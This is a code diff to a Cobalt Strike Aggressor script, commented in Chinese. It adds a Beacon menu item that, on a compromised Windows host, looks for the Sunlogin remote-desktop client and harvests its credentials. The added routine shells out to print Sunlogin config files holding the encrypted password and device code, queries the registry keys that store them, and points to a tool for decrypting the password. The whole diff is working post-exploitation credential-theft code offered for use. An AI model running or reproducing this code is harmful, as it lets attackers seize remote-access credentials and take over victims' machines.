@@ -436,6 +436,56 @@ sub WmiPrvSE_config{
 	dialog_show($dialog);
 }
 
+sub GetBeaconId{
+	foreach $id ($1){
+		return $id;
+	}
+}
+
+sub SunloginClient{
+	btask($1, "向日葵密码解密工具:https://github.com/wafinfo/Sunflower_get_Password");
+	btask($1, "向日葵进程检测");
+	$processname = "SunloginClient";
+	$tasklist = bps($1, lambda({
+		global('$pid $name $entry $foundid')
+		foreach $entry (split("\n", $2)){
+			($name, $null, $pid) = split("\\s+", $entry);
+			if(lindexOf($name, $processname) ne $null){
+				$foundid++;
+				blog2($1, "\c8$name $pid");
+			}
+		}
+		if($foundid ne $null){
+			btask($1, "向日葵配置文件获取");
+			btask($1, "本机验证码参数：encry_pwd\n本机识别码参数：\c3fastcode(去掉开头字母)\n\c3sunlogincode：判断用户是否登录状态\n请判断config.ini配置文件中是否存在\c3sunlogincode参数,存在为登录状态否则未登录");
+			btask($1, "安装版向日葵路径:C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini");
+			btask($1, "便携版(绿色版)向日葵路径: C:\\Users\\<UserName>\\AppData\\Roaming\\Oray\\SunloginClientLite\\sys_lite_config.ini");
+			btask($1, "便携版(绿色版)整体配置文件: C:\\ProgramData\\Oray\\SunloginClient\\config.ini")
+			bshell($1, "type \"C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini\"");
+			$currentuser = binfo($1, "user");
+			if(lindexOf($currentuser, " *") ne $null){
+				$tmp = split(" *", $currentuser);
+				$tmplen = size($tmp) - 2;
+				$tmpname = "";
+				$calc = 0;
+				foreach $x ($tmp){
+					if($calc ne $tmplen){
+						$tmpname .= $x;
+						$calc++;
+					}
+				}
+				$currentuser = $tmpname;
+			}
+			bshell($1, "type \"C:\\Users\\$currentuser\\AppData\\Roaming\\Oray\\SunloginClientLite\\sys_lite_config.ini\"");
+			bshell($1, "type \"C:\\ProgramData\\Oray\\SunloginClient\\config.ini\"");
+			btask($1, "向日葵配置注册表信息获取");
+			$arch = binfo($1, "arch");
+			breg_query($1, "HKU\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo", $arch);
+			breg_query($1, "HKU\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo", $arch);
+		}
+	}, $callback => $2));
+}
+
 popup beacon_bottom{
 	menu "&信息收集"{
 		$bid = $1;
@@ -492,6 +542,12 @@ popup beacon_bottom{
 				netsh_poort($bid, $set);
 			}
 
+		}
+		
+		menu "&常用软件信息收集"{
+			item "&向日葵信息收集"{
+				SunloginClient(GetBeaconId($bid));
+			}
 		}
 	}
 }
